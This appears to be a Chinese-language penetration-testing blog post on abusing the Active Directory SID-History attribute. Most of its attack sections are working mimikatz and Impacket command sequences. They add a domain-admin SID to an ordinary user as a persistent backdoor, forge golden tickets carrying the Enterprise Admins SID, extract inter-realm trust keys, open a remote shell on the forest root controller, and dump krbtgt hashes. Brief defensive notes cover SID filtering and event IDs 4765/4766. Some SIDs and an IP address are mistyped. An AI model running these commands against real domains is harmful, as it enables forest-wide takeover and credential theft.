---
title: "SID-History"
date: 2023-09-28 08:46:23 +0800
category: 渗透测试
tags: [内网,渗透测试,域]
excerpt: SID-History
---
如果知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有 Enterprise Admins组权限（域林中的最高权限）的票据。环境与上文普通金票的生成相同。
首先我们通过klist purge删除当前保存的Kerberos票据，也可以在mimikatz里通过kerberos::purge来删除。
然后通过mimikatz重新生成包含根域SID的新的金票
注意这里是不知道根域YUNYING.LAB的krbtgt的密码HASH的，使用的是子域NEWS.YUNYING.LAB中的KRBTGT的密码HASH。
然后再通过dir访问DC. YUNYING.LAB的共享文件夹，发现已经可以成功访问。
此时的这个票据票是拥有整个域林的控制权的。我们知道制作增强金票的条件是通过SIDHistory那防御方法就是在域内主机迁移时进行SIDHistory过滤，它会擦除SIDHistory属性中的内容。

## 一、SID History属性介绍
​    每个用户帐号都有一个关联的安全标识符（简称SID），SID用于跟踪安全主体在访问资源时的帐户与访问权限。为了支持AD牵移，微软设计了SID History属性，SID History允许另一个帐户的访问被有效的克隆到另一个帐户。
### 查询已经配置了sid history的用户
https://github.com/shigophilo/tools/blob/master/PowerView.ps1
```
Import-Module .\PowerView.ps1
Get-DomainUser | select sidhistory,cn
```
## 二、利用前提条件
​    \1. 当前域与其他域有信任关系，例如当前域与domain1.com和domian2.com存在双向信任
![img](imgs/SID-History/SID2.png)
​    \2. 开启SID History，与其中任意一个林开启SID History信任，即可使用下面的方法

```
netdom trust  /d:domain1.com current.com /enablesidhistory:yes
```
![img](imgs/SID-History/SID3.png)
### 查找域内所有的SIDHistory 
```
adfind -h DC -u ⽤⼾名 -up 密码 -f "&(objectcategory=person)(objectclass=user)(sidhistory=*)" sidhistory 
```
## 三、同一域内的持久化利用
​    SID History可以在同一个域中工作，即DomainA 中的常规用户帐户可以包含 DomainA SID，假如这个DomainA SID是一个特权帐户或组，那就可以在不作为域管 理员成员的情况下授予常规用户域管理员权限，相当于一个后门。
​    \* 普通的域用户user，已经获得其账号明文或者hash，并且该账号密码永不过期
![img](imgs/SID-History/SID1.png)
​    \* 将域管理员的SID赋值给普通域用户user，Mimikatz执行如下：

```
privilege::debug
sid::query /sam:user # 查看用户信息，如：SID
sid::patch
sid::add /sam:user /new:S-1-5-21-2056922362-3943291772-3165935835-500  # RID 500 默认域管理员账号
//也可以
sid::add /sam:user /new:administrator
sid::clear /sam:user # 清除SID History
```
![img](imgs/SID-History/SID4.png)
PS：如果在执行 sid::patch 或者 sid::add 的过程中出现如下错误，则需要开启SID History（参考二）
![img](imgs/SID-History/SID5.png)
​    \* 利用user账号（明文&hash）进行测试：
![img](imgs/SID-History/SID6.png)
![img](imgs/SID-History/SID7.png)
## 四、同一域树下的提权利用方式（Golden Ticket+SID History）
​    对于同一个域树中的父子域来说，如果获得子域中的高权限用户，就可以修改将该用户的SID赋予企业管理员权限，这样对于父域来说该用户也是高权限用户。假设我们已经拿下子域sub.domain.com的域控权限，即可以利用该方法在父域提权。需要的前提信息：
  （1）子域的Krbtgt Hash 和 域SID
  （2）父域的SID
​    \* 正常情况下在子域控上直接访问父域控的C盘会被阻止
![img](imgs/SID-History/SID8.png)
​    \* 使用Mimikatz 利用Golden Ticket+SID History的方式伪造企业管理员SID History（RID 519）

```
kerberos::golden /user:Administrator /krbtgt:Sub_HASH_KRBTGT /domain:sub.domain.local /sid:S-1-5-21-SUB-DOMAIN /sids:S-1-5-DOMAIN-519 /ptt
//访问父域域控
dir \\dc-01\c$

//还可以导出林根域 domain.local 用户 krbtgt 的Hash,然后制作票据访问父域
lsadump::dcsync /domain:domain.local /user:domain.local\krbtgt /csv
```
![img](imgs/SID-History/SID9.png)
​    如果目标系统有多级的域结构，可以通过该方法进行父域提权，进而拿到父域下的所有子域或者说是整个林。

## inter-realm key+SID History 获得林根域权限
![image-20230222150903157](imgs/SID-History/image-20230222150903157.png)
由图可知，只要我们获得了 iter-realm key 就能制作访问其他域任意服务的ST,然后在 ST中加上企业管理员的 SIDHistory，就可以以企业管理员身份访问域林中的任意服务。
那么如何获得 inter-realm key 呢?只要获得域林中任意域的域控权限即可通过相关工具查询出inter-realmkey。
下面介绍通过 mimikatz 获得 inter-realm key
+ 获得inter-realm key
```
//林 xie.com  子域:shanghai.xie.com  父域域控:ad.xie.com
//在子域的域控上通过mimikatz获取inter-realm key
mimikatz.exe "privilege::debug" "lsadump::trust /patch" "exit"
```
![image-20230222151147552](imgs/SID-History/image-20230222151147552.png)
获得如下信息:
获得rc4_hmac_nt 的值为 0f81015ca4691b714e9db485568e5e6b;
shanghai.xie.com 的域 SID  S-1-5-21-909331469-3570597106-3737937367;
xie.com 的 Enterprise Admins 的 SID 为 S-1-5-21-1313979556-36241294334055459191-519
+ impacket攻击
获得inter-realm key 后，就可以利用Impacket 执行如下命令进行攻击了
```
#生成高权限的黄金票据
python3 ticketer.py -nthash 0f81015ca4691b714e9db485568e5e6b -domain-sid s-1-5-21-909331469-3570597106-3737937367 -extra-sid 8-1-5-21-13139795563624129433-4055459191-519 -domain shanghai.xie.com -spn krbtgt/xie.com administrator
# 导入票据
export KRB5CCNAME=administrator.ccache
#获得高权限的 cifs/ad.xie.com 的 ST
python3 getST.py -debug -k -no-pass -spn cifs/ad.xie.com -dc-ip 10.211,55.4 xie.com/administrator
# 远程连接林根域控
python3 smbexec.py -no-pass -k shanghai.xie.com/administrator@ad.xie.com
#导出林根域内用户 krbtgt 的 Hash
python3 secretsdump.py -no-pass -k shanghai.xie.com/administrator@ad.xie.com -just-dc-user "xie\krbtgt" 
```
## 六、林信任的的提权利用
​    文章 [3] 提到一种利用林之间的双向信任关系结合SID History的进行提权方法：
​    按照跨林信任的SID过滤规则（禁止500<=RID<=1000）,我们可以仿造B林中的RID>1000，很多高权限的用户组都可以的RID都大于1000，如Domain Admins（3101）、 Exchange security groups和安装一些安全软件设置的组。
​    但是本人实际测试的过程中，给两个林开启相互的SID History信任，给其中的A域用户添加B域的DnsAdmins 组的SID，本想测试能否利用dnscmd远程加载dll的方式进行利用，但是多次试验均失败。（后续解决）
![img](imgs/SID-History/SID10.png)
六、如何判断已经开启了SID History？
​    \1. 导出活动目录查看用户是否有 sidHistory 属性
​    \2. 利用 ldapdomaindump 导出的domain_trusts.html 中 trustAttributes 字段 设置 [TREAT_AS_EXTERNAL](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c?redirectedfrom=MSDN) 标志（实际测试未出现）
​    \3. 日志记录：
​    \* 4765：SID历史记录被添加到一个帐户
​    \* 4766：尝试将SID历史记录添加到帐户的失败事件
结束语：

​    本人也是一点一点的慢慢学然后总结，其中难免有一些总结错误的点，希望大家能指点出来，感谢 sky_Hb_K1 师傅指出上篇《横向渗透之 [RDP]》的错误点。